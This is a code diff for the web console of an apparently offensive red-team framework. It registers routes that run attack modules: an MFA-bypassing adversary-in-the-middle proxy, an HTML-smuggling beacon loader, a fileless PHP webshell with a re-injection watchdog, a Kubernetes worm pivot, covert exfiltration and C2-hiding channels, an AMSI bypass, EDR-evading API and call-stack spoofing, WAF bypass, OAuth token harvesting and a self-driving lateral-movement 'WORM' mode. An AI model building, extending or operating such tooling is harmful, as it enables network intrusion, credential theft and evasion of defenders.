@@ -22,6 +22,8 @@ import base64
 from datetime import datetime
 import os
 import tempfile
+import re
+from enum import Enum
 
 from cybermodules.evasion_testing import (
     EvasionTester,
@@ -610,8 +612,16 @@ def test_code():
 # INDIVIDUAL SCANNERS
 # ============================================================
 
-@evasion_bp.route('/yara', methods=['POST'])
+@evasion_bp.route('/yara', methods=['GET', 'POST'])
 def yara_scan():
+    if request.method == 'GET':
+        return render_template(
+            'evasion_scanner.html',
+            mode='yara',
+            title='YARA Evasion Scanner',
+            description='Scan payload bytes against YARA rules to surface detectable signatures.',
+        )
+
     """
     Run YARA scan on data
     
@@ -665,8 +675,16 @@ def yara_scan():
     })
 
 
-@evasion_bp.route('/strings', methods=['POST'])
+@evasion_bp.route('/strings', methods=['GET', 'POST'])
 def string_scan():
+    if request.method == 'GET':
+        return render_template(
+            'evasion_scanner.html',
+            mode='strings',
+            title='String Evasion Scanner',
+            description='Detect suspicious strings inside payload bytes that could trigger AV/EDR detection.',
+        )
+
     """
     Check for suspicious strings
     
@@ -692,10 +710,10 @@ def string_scan():
         }), 400
     
     scan_id = int(datetime.now().timestamp())
-    scanner = StringScanner(scan_id)
+    scanner = StringScanner()
     
-    strings = scanner.find_suspicious_strings(payload_bytes)
-    
+    strings = scanner.scan_bytes(payload_bytes)
+
     # Group by category
     by_category = {}
     for s in strings:
@@ -703,21 +721,29 @@ def string_scan():
         if cat not in by_category:
             by_category[cat] = []
         by_category[cat].append({
-            'value': s.value[:50] + '...' if len(s.value) > 50 else s.value,
+            'value': s.string[:50] + '...' if len(s.string) > 50 else s.string,
             'offset': s.offset,
-            'risk_score': s.risk_score
+            'context': s.context,
         })
-    
+
     return jsonify({
         'success': True,
         'total_found': len(strings),
         'by_category': by_category,
-        'total_risk': sum(s.risk_score for s in strings)
+        'total_risk': len(strings)
     })
 
 
-@evasion_bp.route('/entropy', methods=['POST'])
+@evasion_bp.route('/entropy', methods=['GET', 'POST'])
 def entropy_analyze():
+    if request.method == 'GET':
+        return render_template(
+            'evasion_scanner.html',
+            mode='entropy',
+            title='Traffic / Data Entropy Analyzer',
+            description='Analyze byte entropy to determine whether data is packed or encrypted.',
+        )
+
     """
     Analyze data entropy
     
@@ -743,22 +769,29 @@ def entropy_analyze():
         }), 400
     
     scan_id = int(datetime.now().timestamp())
-    analyzer = EntropyAnalyzer(scan_id)
-    
-    analysis = analyzer.analyze(payload_bytes)
-    
+    analyzer = EntropyAnalyzer()
+
+    analysis = analyzer.analyze_bytes(payload_bytes)
+
     return jsonify({
         'success': True,
-        'overall_entropy': analysis['overall_entropy'],
-        'is_packed': analysis['is_packed'],
-        'is_encrypted': analysis['is_encrypted'],
-        'high_entropy_sections': analysis['high_entropy_sections'],
-        'risk_assessment': analysis['risk_assessment']
+        'overall_entropy': analysis.overall_entropy,
+        'is_packed': analysis.is_packed,
+        'is_encrypted': analysis.is_encrypted,
+        'high_entropy_sections': analysis.high_entropy_sections,
     })
 
 
-@evasion_bp.route('/behavioral', methods=['POST'])
+@evasion_bp.route('/behavioral', methods=['GET', 'POST'])
 def behavioral_analyze():
+    if request.method == 'GET':
+        return render_template(
+            'evasion_scanner.html',
+            mode='behavioral',
+            title='Behavioral Pattern Analyzer',
+            description='Analyze source code for suspicious behavioral patterns and risky API calls.',
+        )
+
     """
     Analyze behavioral patterns
     
@@ -779,17 +812,24 @@ def behavioral_analyze():
             'error': 'code field is required'
         }), 400
     
-    scan_id = int(datetime.now().timestamp())
-    analyzer = BehavioralAnalyzer(scan_id)
-    
-    analysis = analyzer.analyze_code(code, language)
-    
+    tokens = re.findall(r'[A-Za-z_][A-Za-z0-9_]*', code)
+    analyzer = BehavioralAnalyzer()
+    matches = analyzer.analyze_strings(tokens)
+
+    def _risk_level(match):
+        level = match.risk_level
+        return level.name if isinstance(level, Enum) else str(level)
+
+    risk_order = {'CLEAN': 0, 'LOW': 1, 'MEDIUM': 2, 'HIGH': 3, 'CRITICAL': 4}
+    levels = [_risk_level(m) for m in matches]
+    overall_risk = max(levels, key=lambda x: risk_order.get(x, 0)) if levels else 'CLEAN'
+
     return jsonify({
         'success': True,
-        'score': analysis['score'],
-        'patterns_found': analysis['patterns_found'],
-        'api_calls': analysis['api_calls'],
-        'risk_level': analysis['risk_level']
+        'score': len(matches),
+        'patterns_found': [m.pattern_name for m in matches],
+        'api_calls': tokens,
+        'risk_level': overall_risk,
     })
 
 
@@ -2682,4 +2722,500 @@ def opsec_check():
         'overall_status': 'safe' if all(r['status'] == 'pass' for r in results.values()) else 'warning',
         'timestamp': datetime.now().isoformat()
     })
+
+
+# ============================================================
+# GHOST PROTOCOL MODULES  (recent commits -> UI)
+# ============================================================
+import json as _json
+from dataclasses import is_dataclass, asdict as _asdict
+from enum import Enum as _Enum
+
+
+def _clean_ghost(obj, _depth=0):
+    """Recursively convert module results into JSON-safe structures."""
+    if _depth > 6:
+        return "..."
+    if obj is None or isinstance(obj, (bool, int, float, str)):
+        return obj
+    if isinstance(obj, bytes):
+        s = obj[:400]
+        return {
+            "is_bytes": True,
+            "len": len(obj),
+            "preview_hex": s.hex(),
+            "preview_ascii": "".join(chr(c) if 32 <= c < 127 else "." for c in s),
+        }
+    if isinstance(obj, (list, tuple, set)):
+        return [_clean_ghost(x, _depth + 1) for x in obj]
+    if isinstance(obj, dict):
+        return {str(k): _clean_ghost(v, _depth + 1) for k, v in obj.items()}
+    if isinstance(obj, _Enum):
+        return {"name": getattr(obj, "name", None), "value": getattr(obj, "value", None)}
+    if is_dataclass(obj):
+        try:
+            return {k: _clean_ghost(v, _depth + 1) for k, v in _asdict(obj).items()}
+        except Exception:
+            pass
+    return str(obj)
+
+
+def _run_aitm(inputs):
+    from evasion.aitm_proxy import create_aitm_proxy
+    platform = str(inputs.get("platform", "office365")).lower()
+    eng = create_aitm_proxy(platform=platform, offline=True)
+    return {"platform": platform, "injection_script": eng.generate_injection_script(), "summary": eng.summary()}
+
+
+def _run_ghost_watchdog(inputs):
+    from evasion.ghost_watchdog import generate_ebpf_watchdog_c, FastCGIWatchdog
+    watch_comm = inputs.get("watch_comm", "php-fpm")
+    src = generate_ebpf_watchdog_c(watch_comm=watch_comm)
+    support = FastCGIWatchdog().check_ebpf_support()
+    return {"watch_comm": watch_comm, "ebpf_source_len": len(src), "ebpf_source_preview": src[:600], "ebpf_support": support}
+
+
+def _run_html_smuggler(inputs):
+    import base64
+    from evasion.html_smuggler import _build_js_loader
+    payload = inputs.get("payload", "SECRET-BEACON-BINARY-DATA-HERE")
+    filename = inputs.get("filename", "beacon.exe")
+    obfuscation = inputs.get("obfuscation", "medium")
+    chunks = [payload[i:i + 16] for i in range(0, len(payload), 16)] or [payload]
+    b64chunks = [base64.b64encode(c.encode()).decode() for c in chunks]
+    html = _build_js_loader(b64chunks, filename, obfuscation)
+    return {"filename": filename, "obfuscation": obfuscation, "loader_snippet": html}
+
+
+def _run_k8s_ghost_pivot(inputs):
+    from evasion.k8s_ghost_pivot import generate_propagation_script
+    trigger = inputs.get("trigger_path", "/dev/shm/ghost.trigger")
+    host = inputs.get("fpm_host", "127.0.0.1")
+    port = int(inputs.get("fpm_port", 9000))
+    return {"trigger_path": trigger, "fpm_host": host, "fpm_port": port,
+            "propagation_script": generate_propagation_script(trigger, host, port)}
+
+
+def _run_k8s_kraken(inputs):
+    from evasion.k8s_kraken_v3 import C2NoiseGenerator
+    g = C2NoiseGenerator()
+    count = max(1, int(inputs.get("count", 3)))
+    events = []
+    for _ in range(count):
+        events += [g.generate_http_get(), g.generate_dns_txt(), g.generate_tls_heartbeat()]
+    return {"count": count, "events": events}
+
+
+def _run_smb_cloaker(inputs):
+    from evasion.smb_rpc_cloaker import SMBRPCCloaker
+    data = inputs.get("data", "SMB negotiate data with embedded C2 beacon bytes").encode()
+    count = int(inputs.get("count", 3))
+    c = SMBRPCCloaker()
+    frags, pad = c.fragment_smb_packet(data)
+    junk = c.generate_smb_junk_traffic("10.0.0.5", count)
+    return {
+        "fragment_count": len(frags),
+        "fragments": [f.__dict__ if hasattr(f, "__dict__") else f for f in frags],
+        "cloaked_padding_len": len(pad),
+        "junk_traffic_count": len(junk),
+    }
+
+
+def _run_web_logic(inputs):
+    from evasion.web_logic_hijacker import WebLogicHijacker
+    body = inputs.get("body", "username=admin&password=Secret123").encode()
+    url = inputs.get("url", "https://mail.corp.local/login")
+    h = WebLogicHijacker(offline=True)
+    events = h.inspect_body(body, url=url, method="POST")
+    return {"intercepted_count": len(events), "events": events, "stats": h._stats, "report": h.report()}
+
+
+def _run_fileless(inputs):
+    from evasion.fileless_webshell import FastCGIInjection
+    host = inputs.get("host", "127.0.0.1")
+    port = int(inputs.get("port", 9000))
+    script = inputs.get("script", "/var/www/html/index.php")
+    inj = FastCGIInjection(host=host, port=port, script_filename=script)
+    shell = inj.generate_ghost_shell()
+    return {"host": host, "port": port, "script": script, "ghost_shell_snippet": shell[:600]}
+
+
+def _run_in_request_exfil(inputs):
+    from evasion.in_request_exfil import ProtocolExfil, ExfilChannel
+    ch = str(inputs.get("channel", "WEBSOCKET")).upper()
+    ch_enum = getattr(ExfilChannel, ch, ExfilChannel.WEBSOCKET)
+    data = inputs.get("data", "SECRET-C2-PAYLOAD-XYZ").encode()
+    ex = ProtocolExfil(channel=ch_enum)
+    recovered = ex.roundtrip(data)
+    return {
+        "channel": ch_enum.name,
+        "original_len": len(data),
+        "recovered_match": recovered == data,
+        "frame_count": len(ex.exfiltrate(data)),
+    }
+
+
+def _run_anti_forensics(inputs):
+    from evasion.anti_forensics_rotation import generate_beacon_id, secure_wipe
+    buf = bytearray(inputs.get("material", "SECRET-KEY-MATERIAL-TO-WIPE").encode())
+    secure_wipe(buf)
+    return {"new_beacon_id": generate_beacon_id(), "wiped_buffer_hex": buf.hex()}
+
+
+def _run_api_sequence(inputs):
+    from evasion.api_sequence_spoofing import APISequenceSpoofer
+    template = inputs.get("template", "svchost_heartbeat")
+    calls = [c.strip() for c in inputs.get("real_calls",
+             "VirtualAlloc,WriteProcessMemory,CreateRemoteThread").split(",") if c.strip()]
+    sp = APISequenceSpoofer(template=template)
+    plan = sp.plan(calls)
+    return {"template": template, "plan_len": len(plan), "plan": plan, "benign_score": sp.benign_score()}
+
+
+def _run_behavioral(inputs):
+    from evasion.behavioral_mimicry import GANTrafficGenerator
+    n = int(inputs.get("num_events", 5))
+    g = GANTrafficGenerator()
+    pats = g.generate_traffic_pattern(n)
+    return {"patterns": pats, "optimal_timing": list(g.get_optimal_timing())}
+
+
+def _run_c2_entropy(inputs):
+    from evasion.c2_traffic_entropy import C2TrafficEntropy
+    carrier = inputs.get("carrier", "png")
+    data = inputs.get("data", "GET /admin HTTP/1.1\r\nHost: c2.example.com").encode()
+    beacon_id = inputs.get("beacon_id", "B-2026-GHOST")
+    e = C2TrafficEntropy(beacon_id=beacon_id, carrier=carrier)
+    carrier_bytes, ctype = e.embed(data)
+    recovered = e.extract(carrier_bytes, ctype)
+    return {"beacon_id": beacon_id, "carrier_type": ctype, "carrier_len": len(carrier_bytes),
+            "recovered_match": recovered == data}
+
+
+def _run_peb_eat(inputs):
+    from evasion.peb_eat_walker import PEBModuleFinder
+    mod = inputs.get("module", "kernel32.dll")
+    f = PEBModuleFinder()
+    try:
+        base = f.get_module_base(mod)
+        winhttp = f.resolve_winhttp_functions()
+        return {"module": mod,
+                "module_base": hex(base) if isinstance(base, int) else base,
+                "winhttp_functions": {k: hex(v) if isinstance(v, int) else v for k, v in winhttp.items()}}
+    except Exception as ex:
+        return {"module": mod, "note": "PEB/EAT walking requires a Windows target process", "error": str(ex)}
+
+
+def _run_call_stack(inputs):
+    from evasion.call_stack_spoofing import CallStackSpoofer
+    s = CallStackSpoofer()
+    return {"status": s.get_status()}
+
+
+def _run_hwbp_amsi(inputs):
+    from evasion.hwbp_amsi_bypass import get_hwbp_amsi_bypass, is_amsi_hwbp_active
+    b = get_hwbp_amsi_bypass()
+    return {"status": b.get_status(), "active": is_amsi_hwbp_active()}
+
+
+def _run_auto_reporting(inputs):
+    from evasion.auto_reporting import AutoReporter, OperationPackage
+    operator = inputs.get("operator", "Therso")
+    domain = inputs.get("target_domain", "corp.local")
+    pkg = OperationPackage(scan_id="op-ghost-2026", operator=operator,
+                            target_domain=domain, campaign="Ghost Protocol v2.6")
+    pkg.add_lateral_result("DC01", "psexec", "ADMIN\\svc-account", success=True)
+    pkg.add_credential("ADMIN\\svc-account", "P@ssw0rd!", domain=domain, cred_type="password")
+    pkg.add_web_hijack_event("login", "https://mail.corp.local", {"user": "admin", "pass": "x"})
+    r = AutoReporter()
+    try:
+        md = r.generate_markdown_summary(pkg)
+    except Exception as ex:
+        md = "(markdown unavailable offline: %s)" % ex
+    return {"report_preview": md[:1500], "scan_id": pkg.scan_id}
+
+
+def _run_autonomous_hunter(inputs):
+    from evasion.autonomous_hunter import AutonomousDecisionEngine, HunterMode
+    mode = str(inputs.get("mode", "WORM")).upper()
+    m = getattr(HunterMode, mode, HunterMode.WORM)
+    eng = AutonomousDecisionEngine(mode=m)
+    ranked = eng.rank_targets([])
+    return {"mode": eng.mode.name, "ranked_targets": ranked,
+            "available_modes": [x.name for x in HunterMode]}
+
+
+def _run_advanced_waf_bypass(inputs):
+    from evasion.advanced_waf_bypass import run_advanced_waf_bypass
+    return run_advanced_waf_bypass(inputs)
+
+
+def _run_cred_harvest(inputs):
+    from tools.cred_harvest import run_cred_harvest
+    return run_cred_harvest(inputs)
+
+
+_GHOST_MODULES = [
+    {
+        "slug": "aitm-proxy", "name": "AiTM Proxy", "icon": "fa-user-secret", "color": "red",
+        "subtitle": "Adversary-in-The-Middle credential & session hijack",
+        "description": "Reverse proxy that intercepts MFA tokens and session cookies, then replays them against cloud identity providers to seize live sessions.",
+        "capabilities": ["Reverse proxy rewrite engine", "Session cookie & bearer token replay",
+                         "JavaScript injector for credential capture", "Platform-specific configs (O365, Okta, Azure)"],
+        "inputs": [
+            {"name": "platform", "label": "Identity Platform", "type": "select", "default": "office365", "options": ["office365", "okta", "azure"]},
+        ], "run": _run_aitm, "offline": True,
+    },
+    {
+        "slug": "html-smuggler", "name": "HTML Smuggler", "icon": "fa-box-open", "color": "orange",
+        "subtitle": "Chunked HTML smuggling loader generator",
+        "description": "Builds HTML/JS loaders that reassemble an encrypted beacon payload entirely in the browser, defeating content-inspection gateways.",
+        "capabilities": ["Base64 chunk splitting", "Obfuscated JS loader", "Decoy/legit page wrapper", "Multiple smuggle templates"],
+        "inputs": [
+            {"name": "payload", "label": "Beacon Payload", "type": "text", "default": "SECRET-BEACON-BINARY-DATA-HERE"},
+            {"name": "filename", "label": "Drop Filename", "type": "text", "default": "beacon.exe"},
+            {"name": "obfuscation", "label": "Obfuscation", "type": "select", "default": "medium", "options": ["low", "medium", "high"]},
+        ], "run": _run_html_smuggler, "offline": True,
+    },
+    {
+        "slug": "k8s-ghost-pivot", "name": "K8s Ghost Pivot", "icon": "fa-dharmachakra", "color": "blue",
+        "subtitle": "Container-to-container worm pivot over shared volumes",
+        "description": "Detects pods sharing volumes, plans worm-like pivots, and generates ephemeral re-arming scripts and DaemonSets that re-inject the in-memory hook.",
+        "capabilities": ["Shared-volume pod discovery", "Worm-style pivot planning", "Ephemeral payload planting", "DaemonSet YAML generation"],
+        "inputs": [
+            {"name": "trigger_path", "label": "Trigger Path", "type": "text", "default": "/dev/shm/ghost.trigger"},
+            {"name": "fpm_host", "label": "FPM Host", "type": "text", "default": "127.0.0.1"},
+            {"name": "fpm_port", "label": "FPM Port", "type": "text", "default": "9000"},
+        ], "run": _run_k8s_ghost_pivot, "offline": True,
+    },
+    {
+        "slug": "k8s-kraken-v3", "name": "K8s Kraken v3", "icon": "fa-water", "color": "indigo",
+        "subtitle": "C2 traffic noise injection for Kubernetes",
+        "description": "Generates realistic benign-looking HTTP/DNS/TLS noise to mask C2 beacon traffic inside cluster east-west and ingress flows.",
+        "capabilities": ["HTTP GET/POST noise", "DNS TXT query noise", "TLS heartbeat shaping", "Evasion scoring & stats"],
+        "inputs": [
+            {"name": "count", "label": "Noise Bursts", "type": "text", "default": "3"},
+        ], "run": _run_k8s_kraken, "offline": True,
+    },
+    {
+        "slug": "smb-rpc-cloaker", "name": "SMB/RPC Cloaker", "icon": "fa-network-wired", "color": "pink",
+        "subtitle": "Fragment & pad SMB/RPC traffic to evade NDR",
+        "description": "Splits SMB packets, pads RPC calls with benign appearances, obfuscates pipe names and injects timing jitter to hide Impacket tooling.",
+        "capabilities": ["SMB packet fragmentation", "Benign RPC padding", "Named-pipe obfuscation", "Impacket command wrapping & jitter"],
+        "inputs": [
+            {"name": "data", "label": "C2 Payload Bytes", "type": "text", "default": "SMB negotiate data with embedded C2 beacon bytes"},
+            {"name": "count", "label": "Junk Traffic Count", "type": "text", "default": "3"},
+        ], "run": _run_smb_cloaker, "offline": True,
+    },
+    {
+        "slug": "web-logic-hijacker", "name": "Web Logic Hijacker", "icon": "fa-code", "color": "rose",
+        "subtitle": "Intercept credentials & forward to Monolith C2",
+        "description": "Inspects in-flight request bodies for credentials and sensitive patterns, then transparently forwards matched events to the Monolith C2 forwarder.",
+        "capabilities": ["Pattern-based body inspection", "Credential interception", "C2 event forwarding", "Built-in pattern library"],
+        "inputs": [
+            {"name": "body", "label": "POST Body", "type": "text", "default": "username=admin&password=Secret123"},
+            {"name": "url", "label": "Target URL", "type": "text", "default": "https://mail.corp.local/login"},
+        ], "run": _run_web_logic, "offline": True,
+    },
+    {
+        "slug": "fileless-webshell", "name": "Fileless WebShell", "icon": "fa-ghost", "color": "red",
+        "subtitle": "Fileless FastCGI in-memory PHP webshell",
+        "description": "Builds a request that drops an encrypted, in-memory PHP webshell into a FastCGI/PHP-FPM worker without writing a file to disk.",
+        "capabilities": ["FastCGI record crafting", "Encrypted in-memory payload", "Diskless PHP execution", "Re-injection support"],
+        "inputs": [
+            {"name": "host", "label": "FPM Host", "type": "text", "default": "127.0.0.1"},
+            {"name": "port", "label": "FPM Port", "type": "text", "default": "9000"},
+            {"name": "script", "label": "Script Filename", "type": "text", "default": "/var/www/html/index.php"},
+        ], "run": _run_fileless, "offline": True,
+    },
+    {
+        "slug": "in-request-exfil", "name": "In-Request Exfil", "icon": "fa-file-export", "color": "rose",
+        "subtitle": "Covert exfiltration inside legit protocol frames",
+        "description": "Fragments payloads into WebSocket frames, HTTP/2 streams or DNS queries so exfiltration rides inside ordinary application traffic.",
+        "capabilities": ["WebSocket frame tunneling", "HTTP/2 stream smuggling", "Fragmentation & reconstruction", "In-memory roundtrip verification"],
+        "inputs": [
+            {"name": "data", "label": "Data", "type": "text", "default": "SECRET-C2-PAYLOAD-XYZ"},
+            {"name": "channel", "label": "Channel", "type": "select", "default": "WEBSOCKET", "options": ["WEBSOCKET", "HTTP2", "DNS"]},
+        ], "run": _run_in_request_exfil, "offline": True,
+    },
+    {
+        "slug": "anti-forensics-rotation", "name": "Anti-Forensics Rotation", "icon": "fa-sync", "color": "amber",
+        "subtitle": "24h rotation of beacon ID & all keys",
+        "description": "Periodically rotates the beacon identity and all cryptographic material, with signed envelopes to keep the backend in sync and break forensic correlation.",
+        "capabilities": ["Beacon ID rotation", "Key & task-crypto rotation", "Signed rotation envelopes", "Tamper verification"],
+        "inputs": [
+            {"name": "material", "label": "Key Material To Wipe", "type": "text", "default": "SECRET-KEY-MATERIAL-TO-WIPE"},
+        ], "run": _run_anti_forensics, "offline": True,
+    },
+    {
+        "slug": "api-sequence-spoofing", "name": "API Sequence Spoofing", "icon": "fa-random", "color": "violet",
+        "subtitle": "Blend malicious API calls into benign behaviour",
+        "description": "Wraps real malicious API call sequences with chaff that mimics legitimate process behaviour (svchost, explorer, lsass) to defeat EDR sequence analysis.",
+        "capabilities": ["Template-based chaff injection", "Benign score modelling", "Sequence scoring", "Multi-template support"],
+        "inputs": [
+            {"name": "real_calls", "label": "Real API Calls (csv)", "type": "text", "default": "VirtualAlloc,WriteProcessMemory,CreateRemoteThread"},
+            {"name": "template", "label": "Template", "type": "select", "default": "svchost_heartbeat", "options": ["svchost_heartbeat", "explorer_browse", "lsass_query", "wmi_poll"]},
+        ], "run": _run_api_sequence, "offline": True,
+    },
+    {
+        "slug": "behavioral-mimicry", "name": "Behavioral Mimicry", "icon": "fa-theater-masks", "color": "fuchsia",
+        "subtitle": "GAN-driven traffic & human behaviour mimicry",
+        "description": "Uses a GAN to generate traffic patterns and simulates human mouse/keyboard cadence to defeat behavioural analytics and UEBA.",
+        "capabilities": ["GAN traffic generation", "Optimal timing estimation", "Human mouse simulation", "Typing cadence modelling"],
+        "inputs": [
+            {"name": "num_events", "label": "Pattern Count", "type": "text", "default": "5"},
+        ], "run": _run_behavioral, "offline": True,
+    },
+    {
+        "slug": "c2-traffic-entropy", "name": "C2 Traffic Entropy", "icon": "fa-wave-square", "color": "teal",
+        "subtitle": "Hide C2 inside PNG / HTML carrier entropy",
+        "description": "Embeds encrypted C2 envelopes inside the entropy of PNG images or HTML documents so beacons blend into normal web traffic.",
+        "capabilities": ["PNG carrier embedding", "HTML carrier embedding", "Auto carrier selection", "Roundtrip extraction"],
+        "inputs": [
+            {"name": "data", "label": "Data", "type": "text", "default": "GET /admin HTTP/1.1\r\nHost: c2.example.com"},
+            {"name": "carrier", "label": "Carrier", "type": "select", "default": "png", "options": ["png", "html", "auto"]},
+            {"name": "beacon_id", "label": "Beacon ID", "type": "text", "default": "B-2026-GHOST"},
+        ], "run": _run_c2_entropy, "offline": True,
+    },
+    {
+        "slug": "peb-eat-walker", "name": "PEB/EAT Walker", "icon": "fa-sitemap", "color": "lime",
+        "subtitle": "Manual PEB/EAT resolution (no import table)",
+        "description": "Walks the PEB to locate module bases and parses the Export Address Table to resolve Win32 functions, avoiding the Import Address Table entirely.",
+        "capabilities": ["PEB module base resolution", "EAT function resolution", "winhttp function resolution", "Import-table-free loading"],
+        "inputs": [
+            {"name": "module", "label": "Module Name", "type": "text", "default": "kernel32.dll"},
+        ], "run": _run_peb_eat, "offline": False,
+    },
+    {
+        "slug": "call-stack-spoofing", "name": "Call Stack Spoofing", "icon": "fa-layer-group", "color": "sky",
+        "subtitle": "Legitimate return addresses on the call stack",
+        "description": "Spoofs the call stack with addresses from legitimate modules so memory scans and stack-walk detections see only benign callers.",
+        "capabilities": ["Legitimate address collection", "Thread context spoofing", "Encrypted address storage", "Status reporting"],
+        "inputs": [], "run": _run_call_stack, "offline": False,
+    },
+    {
+        "slug": "hwbp-amsi-bypass", "name": "HWBP AMSI Bypass", "icon": "fa-microchip", "color": "red",
+        "subtitle": "Hardware-breakpoint AMSI/AV bypass via VEH",
+        "description": "Uses hardware debug registers (DR0) and a Vectored Exception Handler to intercept and neutralize AMSI/AV scans at the point of API invocation.",
+        "capabilities": ["Hardware breakpoint (DR0) set/clear", "Vectored Exception Handler", "AMSI context resolution", "Active-state probing"],
+        "inputs": [], "run": _run_hwbp_amsi, "offline": False,
+    },
+    {
+        "slug": "auto-reporting", "name": "Auto-Reporting", "icon": "fa-file-contract", "color": "emerald",
+        "subtitle": "Zero-touch Red Team assessment reports",
+        "description": "Ingests raw operation telemetry (lateral moves, credentials, web hijacks, C2 beacons) and produces customer-ready HTML/PDF/Markdown/JSON reports.",
+        "capabilities": ["Operation package normalisation", "Markdown executive summary", "MITRE ATT&CK mapping", "Multi-format export"],
+        "inputs": [
+            {"name": "operator", "label": "Operator", "type": "text", "default": "Therso"},
+            {"name": "target_domain", "label": "Target Domain", "type": "text", "default": "corp.local"},
+        ], "run": _run_auto_reporting, "offline": True,
+    },
+    {
+        "slug": "autonomous-hunter", "name": "Autonomous Hunter", "icon": "fa-robot", "color": "purple",
+        "subtitle": "Self-driving lateral movement & pivoting",
+        "description": "Discovers AD assets, ranks targets with a decision engine, and auto-pivots through the network harvesting credentials into an encrypted vault.",
+        "capabilities": ["AD computer discovery", "Target ranking engine", "Auto-pivot chains", "Encrypted credential vault"],
+        "inputs": [
+            {"name": "mode", "label": "Hunter Mode", "type": "select", "default": "WORM", "options": ["WORM", "SAFE", "AGGRESSIVE"]},
+        ], "run": _run_autonomous_hunter, "offline": True,
+    },
+    {
+        "slug": "advanced-waf-bypass", "name": "Advanced WAF Bypass", "icon": "fa-shield-alt", "color": "rose",
+        "subtitle": "HTTP/2 QUIC Smuggling & GraphQL Tunneling",
+        "description": "Bypass Cloudflare/Akamai/Imperva/AWS WAF v3/v4 via HTTP/2 stream desync, CL/TE smuggling, and GraphQL Base64 multipart tunneling.",
+        "capabilities": ["HTTP/2 stream smuggling", "CL/TE confusion", "GraphQL multipart tunneling", "WAF profile targeting"],
+        "inputs": [
+            {"name": "target_host", "label": "Target Host", "type": "text", "default": "target.corp.local"},
+            {"name": "target_port", "label": "Target Port", "type": "text", "default": "443"},
+            {"name": "web_path", "label": "Web Path", "type": "text", "default": "/api/graphql"},
+            {"name": "waf_profile", "label": "WAF Profile", "type": "select", "default": "cloudflare", "options": ["cloudflare", "akamai", "imperva", "aws_waf"]},
+            {"name": "payload", "label": "Attack Payload", "type": "text", "default": "MONOLITH-WAF-BYPASS-PAYLOAD-2026"},
+        ], "run": _run_advanced_waf_bypass, "offline": True,
+    },
+    {
+        "slug": "cred-harvest", "name": "Cred Harvest", "icon": "fa-key", "color": "amber",
+        "subtitle": "OAuth & OIDC Session Hijacking Kit",
+        "description": "Generates phishing/redirect payloads to steal OAuth/OIDC authorization codes and refresh tokens, bypassing MFA at the identity layer.",
+        "capabilities": ["OAuth phishing artifact", "Open redirect + OAuth chain", "Token parse & replay", "MFA bypass simulation"],
+        "inputs": [
+            {"name": "platform", "label": "Identity Platform", "type": "select", "default": "m365", "options": ["m365", "okta", "azure_ad"]},
+            {"name": "c2_endpoint", "label": "C2 Endpoint", "type": "text", "default": "https://c2.corp.local/ingest"},
+            {"name": "wrapper_url", "label": "Wrapper URL", "type": "text", "default": "https://docs.corp.local/s/q3-report"},
+        ], "run": _run_cred_harvest, "offline": True,
+    },
+    {
+        "slug": "ghost-watchdog", "name": "Ghost Watchdog", "icon": "fa-eye", "color": "cyan",
+        "subtitle": "Keep the in-memory webshell alive",
+        "description": "Monitors the FastCGI/PHP-FPM worker and re-injects the in-memory webshell if the process restarts or the hook is cleaned, using eBPF or polling.",
+        "capabilities": ["eBPF watchdog source gen", "FastCGI reinjection", "Poll-mode fallback", "Injection reporting"],
+        "inputs": [
+            {"name": "watch_comm", "label": "Watch Comm", "type": "text", "default": "php-fpm"},
+        ], "run": _run_ghost_watchdog, "offline": True,
+    },
+]
+
+
+def _get_ghost_module(slug):
+    for m in _GHOST_MODULES:
+        if m["slug"] == slug:
+            return m
+    return None
+
+
+def _make_ghost_page(slug):
+    def page():
+        m = _get_ghost_module(slug)
+        if not m:
+            return jsonify({"error": "unknown module"}), 404
+        return render_template("ghost_module.html", **m, now=datetime.now().strftime('%H:%M:%S'))
+    return page
+
+
+def _make_ghost_run(slug):
+    def run():
+        m = _get_ghost_module(slug)
+        if not m:
+            return jsonify({"success": False, "error": "unknown module"}), 404
+        try:
+            data = request.get_json(silent=True) or {}
+            result = m["run"](data)
+            return jsonify({"success": True, "result": _clean_ghost(result)})
+        except Exception as ex:
+            logger.exception("Ghost module run error: %s", slug)
+            return jsonify({"success": False, "error": str(ex)}), 500
+    return run
+
+
+for _m in _GHOST_MODULES:
+    _slug = _m["slug"]
+    evasion_bp.add_url_rule(f"/ghost/{_slug}", f"ghost_page_{_slug}", _make_ghost_page(_slug))
+    evasion_bp.add_url_rule(f"/api/ghost/{_slug}/run", f"ghost_run_{_slug}",
+                            _make_ghost_run(_slug), methods=["POST"])
+
+
+def _ghost_module_meta():
+    """Serializable metadata for the Ghost Protocol console (no callable refs)."""
+    meta = []
+    for m in _GHOST_MODULES:
+        meta.append({
+            "slug": m["slug"],
+            "name": m["name"],
+            "icon": m["icon"],
+            "color": m["color"],
+            "subtitle": m["subtitle"],
+            "description": m["description"],
+            "capabilities": m["capabilities"],
+            "inputs": m["inputs"],
+            "offline": m["offline"],
+        })
+    return meta
+
+
+@evasion_bp.route('/ghost-console')
+def ghost_console_page():
+    """Ghost Protocol unified operator console."""
+    return render_template('ghost_console.html',
+                           modules=_ghost_module_meta(),
+                           now=datetime.now().strftime('%H:%M:%S'))
+
 
